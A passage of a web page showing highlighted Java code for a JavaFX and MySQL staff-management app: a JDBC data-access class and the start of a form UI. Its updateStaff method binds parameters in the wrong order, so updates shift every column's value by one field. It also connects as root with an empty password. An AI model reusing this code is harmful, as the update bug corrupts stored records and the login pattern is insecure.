        <span class="token keyword">try</span> <span class="token punctuation">(</span><span class="token class-name">PreparedStatement</span> preparedStatement <span class="token operator">=</span> connection<span class="token punctuation">.</span><span class="token function">prepareStatement</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">mapStaffToStatement</span><span class="token punctuation">(</span>staff<span class="token punctuation">,</span> preparedStatement<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> preparedStatement<span class="token punctuation">.</span><span class="token function">executeUpdate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">updateStaff</span><span class="token punctuation">(</span><span class="token class-name">Staff</span> staff<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">{</span>
        <span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"UPDATE staff SET lastName = ?, firstName = ?, mi = ?, address = ?, city = ?, state = ?, telephone = ?, email = ? WHERE id = ?;"</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">(</span><span class="token class-name">PreparedStatement</span> preparedStatement <span class="token operator">=</span> connection<span class="token punctuation">.</span><span class="token function">prepareStatement</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">mapStaffToStatement</span><span class="token punctuation">(</span>staff<span class="token punctuation">,</span> preparedStatement<span class="token punctuation">)</span><span class="token punctuation">;</span>
            preparedStatement<span class="token punctuation">.</span><span class="token function">setString</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> staff<span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> preparedStatement<span class="token punctuation">.</span><span class="token function">executeUpdate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// Helper methods to map between ResultSet/PreparedStatement and Staff object</span>
    <span class="token keyword">private</span> <span class="token class-name">Staff</span> <span class="token function">mapRowToStaff</span><span class="token punctuation">(</span><span class="token class-name">ResultSet</span> resultSet<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">{</span>
        <span class="token class-name">Staff</span> staff <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Staff</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        staff<span class="token punctuation">.</span><span class="token function">setId</span><span class="token punctuation">(</span>resultSet<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        staff<span class="token punctuation">.</span><span class="token function">setLastName</span><span class="token punctuation">(</span>resultSet<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"lastName"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        staff<span class="token punctuation">.</span><span class="token function">setFirstName</span><span class="token punctuation">(</span>resultSet<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"firstName"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        staff<span class="token punctuation">.</span><span class="token function">setMi</span><span class="token punctuation">(</span>resultSet<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"mi"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        staff<span class="token punctuation">.</span><span class="token function">setAddress</span><span class="token punctuation">(</span>resultSet<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"address"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        staff<span class="token punctuation">.</span><span class="token function">setCity</span><span class="token punctuation">(</span>resultSet<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"city"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        staff<span class="token punctuation">.</span><span class="token function">setState</span><span class="token punctuation">(</span>resultSet<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"state"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        staff<span class="token punctuation">.</span><span class="token function">setTelephone</span><span class="token punctuation">(</span>resultSet<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"telephone"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        staff<span class="token punctuation">.</span><span class="token function">setEmail</span><span class="token punctuation">(</span>resultSet<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"email"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> staff<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">mapStaffToStatement</span><span class="token punctuation">(</span><span class="token class-name">Staff</span> staff<span class="token punctuation">,</span> <span class="token class-name">PreparedStatement</span> preparedStatement<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">{</span>
        preparedStatement<span class="token punctuation">.</span><span class="token function">setString</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> staff<span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        preparedStatement<span class="token punctuation">.</span><span class="token function">setString</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> staff<span class="token punctuation">.</span><span class="token function">getLastName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        preparedStatement<span class="token punctuation">.</span><span class="token function">setString</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> staff<span class="token punctuation">.</span><span class="token function">getFirstName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        preparedStatement<span class="token punctuation">.</span><span class="token function">setString</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> staff<span class="token punctuation">.</span><span class="token function">getMi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        preparedStatement<span class="token punctuation">.</span><span class="token function">setString</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> staff<span class="token punctuation">.</span><span class="token function">getAddress</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        preparedStatement<span class="token punctuation">.</span><span class="token function">setString</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> staff<span class="token punctuation">.</span><span class="token function">getCity</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        preparedStatement<span class="token punctuation">.</span><span class="token function">setString</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> staff<span class="token punctuation">.</span><span class="token function">getState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        preparedStatement<span class="token punctuation">.</span><span class="token function">setString</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> staff<span class="token punctuation">.</span><span class="token function">getTelephone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        preparedStatement<span class="token punctuation">.</span><span class="token function">setString</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> staff<span class="token punctuation">.</span><span class="token function">getEmail</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Staff</span><span class="token punctuation">&gt;</span></span> <span class="token function">findAllStaff</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">{</span>
        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Staff</span><span class="token punctuation">&gt;</span></span> staffList <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"SELECT id, lastName, firstName, mi, address, city, state, telephone, email FROM staff;"</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">(</span><span class="token class-name">Statement</span> statement <span class="token operator">=</span> connection<span class="token punctuation">.</span><span class="token function">createStatement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">ResultSet</span> resultSet <span class="token operator">=</span> statement<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span>resultSet<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                staffList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token function">mapRowToStaff</span><span class="token punctuation">(</span>resultSet<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> staffList<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// Close connection</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>connection <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>connection<span class="token punctuation">.</span><span class="token function">isClosed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            connection<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>StaffApp.java</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">SQLException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ArrayList</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>application<span class="token punctuation">.</span></span><span class="token class-name">Application</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">FXCollections</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">ObservableList</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>geometry<span class="token punctuation">.</span></span><span class="token class-name">Pos</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span></span><span class="token class-name">Scene</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>chart<span class="token punctuation">.</span></span><span class="token class-name">BarChart</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>chart<span class="token punctuation">.</span></span><span class="token class-name">CategoryAxis</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>chart<span class="token punctuation">.</span></span><span class="token class-name">NumberAxis</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>chart<span class="token punctuation">.</span></span><span class="token class-name">PieChart</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>chart<span class="token punctuation">.</span></span><span class="token class-name">XYChart</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>control<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">HBox</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">VBox</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>text<span class="token punctuation">.</span></span><span class="token class-name">Text</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>stage<span class="token punctuation">.</span></span><span class="token class-name">Stage</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">StaffApp</span> <span class="token keyword">extends</span> <span class="token class-name">Application</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">double</span> <span class="token constant">MIN_WIDTH</span> <span class="token operator">=</span> <span class="token number">320.0</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">double</span> <span class="token constant">MIN_HEIGHT</span> <span class="token operator">=</span> <span class="token number">220.0</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token class-name">StaffDao</span> staffDao<span class="token punctuation">;</span>

    <span class="token comment">// UI组件</span>
    <span class="token keyword">private</span> <span class="token class-name">TextField</span> idField<span class="token punctuation">,</span> lastNameField<span class="token punctuation">,</span> firstNameField<span class="token punctuation">,</span> miField<span class="token punctuation">,</span> addressField<span class="token punctuation">,</span> cityField<span class="token punctuation">,</span> stateField<span class="token punctuation">,</span>
            telephoneField<span class="token punctuation">,</span> emailField<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token class-name">Button</span> viewBtn<span class="token punctuation">,</span> insertBtn<span class="token punctuation">,</span> updateBtn<span class="token punctuation">,</span> clearBtn<span class="token punctuation">,</span> showChartBtn<span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token class-name">Stage</span> stage<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token comment">// 初始化数据库连接</span>
        staffDao <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StaffDao</span><span class="token punctuation">(</span><span class="token string">"jdbc:mysql://127.0.0.1:3306/Staff"</span><span class="token punctuation">,</span> <span class="token string">"root"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">VBox</span> vBox <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VBox</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        vBox<span class="token punctuation">.</span><span class="token function">setMinWidth</span><span class="token punctuation">(</span><span class="token constant">MIN_WIDTH</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        vBox<span class="token punctuation">.</span><span class="token function">setMinHeight</span><span class="token punctuation">(</span><span class="token constant">MIN_HEIGHT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 添加UI组件</span>
        <span class="token function">addComponents</span><span class="token punctuation">(</span>vBox<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 设置场景和舞台</span>
        <span class="token class-name">Scene</span> scene <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scene</span><span class="token punctuation">(</span>vBox<span class="token punctuation">)</span><span class="token punctuation">;</span>
        stage<span class="token punctuation">.</span><span class="token function">setScene</span><span class="token punctuation">(</span>scene<span class="token punctuation">)</span><span class="token punctuation">;</span>
        stage<span class="token punctuation">.</span><span class="token function">setTitle</span><span class="token punctuation">(</span><span class="token string">"Staff Management"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        stage<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">addComponents</span><span class="token punctuation">(</span><span class="token class-name">VBox</span> vBox<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 标题</span>
        <span class="token class-name">Text</span> title <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Text</span><span class="token punctuation">(</span><span class="token string">"Record found"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        vBox<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>title<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// id框</span>
        idField <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TextField</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Label</span> idLabel <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Label</span><span class="token punctuation">(</span><span class="token string">"ID"</span><span class="token punctuation">,</span> idField<span class="token punctuation">)</span><span class="token punctuation">;</span>
        idLabel<span class="token punctuation">.</span><span class="token function">setContentDisplay</span><span class="token punctuation">(</span><span class="token class-name">ContentDisplay</span><span class="token punctuation">.</span><span class="token constant">RIGHT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        vBox<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>idLabel<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 信息行</span>
        <span class="token class-name">HBox</span> infoBox <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HBox</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        lastNameField <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TextField</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Label</span> lastNameLabel <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Label</span><span class="token punctuation">(</span><span class="token string">"Last Name"</span><span class="token punctuation">,</span> lastNameField<span class="token punctuation">)</span><span class="token punctuation">;</span>
        lastNameLabel<span class="token punctuation">.</span><span class="token function">setContentDisplay</span><span class="token punctuation">(</span><span class="token class-name">ContentDisplay</span><span class="token punctuation">.</span><span class="token constant">RIGHT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        firstNameField <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TextField</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Label</span> firstNameLabel <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Label</span><span class="token punctuation">(</span><span class="token string">"First Name"</span><span class="token punctuation">,</span> firstNameField<span class="token punctuation">)</span><span class="token punctuation">;</span>
        firstNameLabel<span class="token punctuation">.</span><span class="token function">setContentDisplay</span><span class="token punctuation">(</span><span class="token class-name">ContentDisplay</span><span class="token punctuation">.</span><span class="token constant">RIGHT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        miField <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TextField</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Label</span> miLabel <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Label</span><span class="token punctuation">(</span><span class="token string">"MI"</span><span class="token punctuation">,</span> miField<span class="token punctuation">)</span><span class="token punctuation">;</span>
        miLabel<span class="token punctuation">.</span><span class="token function">setContentDisplay</span><span class="token punctuation">(</span><span class="token class-name">ContentDisplay</span><span class="token punctuation">.</span><span class="token constant">RIGHT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        infoBox<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>lastNameLabel<span class="token punctuation">,</span> firstNameLabel<span class="token punctuation">,</span> miLabel<span class="token punctuation">)</span><span class="token punctuation">;</span>
        vBox<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>infoBox<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 地址</span>
        addressField <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TextField</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Label</span> addressLabel <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Label</span><span class="token punctuation">(</span><span class="token string">"Address"</span><span class="token punctuation">,</span> addressField<span class="token punctuation">)</span><span class="token punctuation">;</span>
        addressLabel<span class="token punctuation">.</span><span class="token function">setContentDisplay</span><span class="token punctuation">(</span><span class="token class-name">ContentDisplay</span><span class="token punctuation">.</span><span class="token constant">RIGHT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        vBox<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>addressLabel<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 城市和州行</span>
        <span class="token class-name">HBox</span> briefAddressBox <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HBox</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        cityField <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TextField</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Label</span> cityLabel <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Label</span><span class="token punctuation">(</span><span class="token string">"City"</span><span class="token punctuation">,</span> cityField<span class="token punctuation">)</span><span class="token punctuation">;</span>
        cityLabel<span class="token punctuation">.</span><span class="token function">setContentDisplay</span><span class="token punctuation">(</span><span class="token class-name">ContentDisplay</span><span class="token punctuation">.</span><span class="token constant">RIGHT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        stateField <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TextField</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Label</span> stateLabel <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Label</span><span class="token punctuation">(</span><span class="token string">"State"</span><span class="token punctuation">,</span> stateField<span class="token punctuation">)</span><span class="token punctuation">;</span>
        stateLabel<span class="token punctuation">.</span><span class="token function">setContentDisplay</span><span class="token punctuation">(</span><span class="token class-name">ContentDisplay</span><span class="token punctuation">.</span><span class="token constant">RIGHT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        briefAddressBox<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>cityLabel<span class="token punctuation">,</span> stateLabel<span class="token punctuation">)</span><span class="token punctuation">;</span>
        vBox<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>briefAddressBox<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 电话</span>
        telephoneField <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TextField</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Label</span> telephoneLabel <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Label</span><span class="token punctuation">(</span><span class="token string">"Telephone"</span><span class="token punctuation">,</span> telephoneField<span class="token punctuation">)</span><span class="token punctuation">;</span>
        telephoneLabel<span class="token punctuation">.</span><span class="token function">setContentDisplay</span><span class="token punctuation">(</span><span class="token class-name">ContentDisplay</span><span class="token punctuation">.</span><span class="token constant">RIGHT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        vBox<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>telephoneLabel<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// Email</span>
        emailField <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TextField</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Label</span> emailLabel <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Label</span><span class="token punctuation">(</span><span class="token string">"Email"</span><span class="token punctuation">,</span> emailField<span class="token punctuation">)</span><span class="token punctuation">;</span>
        emailLabel<span class="token punctuation">.</span><span class="token function">setContentDisplay</span><span class="token punctuation">(</span><span class="token class-name">ContentDisplay</span><span class="token punctuation">.</span><span class="token constant">RIGHT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        vBox<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>emailLabel<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 控制按钮</span>
        <span class="token class-name">HBox</span> controlBox <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HBox</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        controlBox<span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span><span class="token class-name">Pos</span><span class="token punctuation">.</span><span class="token constant">CENTER</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

